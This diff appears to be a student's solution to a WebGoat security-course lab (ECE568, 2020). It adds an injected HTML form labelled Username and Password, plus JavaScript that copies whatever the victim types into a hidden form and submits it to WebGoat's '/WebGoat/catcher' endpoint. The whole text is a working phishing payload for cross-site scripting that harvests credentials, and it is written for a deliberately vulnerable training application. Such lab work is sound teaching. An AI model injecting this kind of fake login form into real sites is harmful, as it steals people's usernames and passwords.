@@ -1,0 +1,39 @@
+<br>
+<form name="form">
+  <label for="phishUsername">Username:</label>
+  <input type="text" id="ece568-2020-user" name="phishUsername"><br>
+  <label for="phishPassword">Password:</label>
+  <input type="text" id="ece568-2020-pass" name="phishPassword"><br>
+</form>
+<button id="ece568-2020-submit" onclick="onSubmit()">Submit</button>
+
+<script>
+function onSubmit() {
+  let to_submit = document.createElement("form");
+  to_submit.setAttribute("action", "/WebGoat/catcher");
+
+  let propertyElement = document.createElement("input");
+  propertyElement.setAttribute("type", "text");
+  propertyElement.setAttribute("name", "PROPERTY");
+  propertyElement.setAttribute("value", "yes");
+  to_submit.appendChild(propertyElement);
+
+  let username = document.forms["form"]["phishUsername"].value;
+  let usrElement = document.createElement("input");
+  usrElement.setAttribute("type", "text");
+  usrElement.setAttribute("value", username);
+  usrElement.setAttribute("name", "phishUsername"); 
+  to_submit.appendChild(usrElement);
+
+  let password = document.forms["form"]["phishPassword"].value;
+  let pwdElement = document.createElement("input");
+  pwdElement.setAttribute("type", "text");
+  pwdElement.setAttribute("value", password);
+  pwdElement.setAttribute("name", "phishPassword");
+  to_submit.appendChild(pwdElement);
+
+  document.body.appendChild(to_submit);
+
+  to_submit.submit();
+}
+</script>
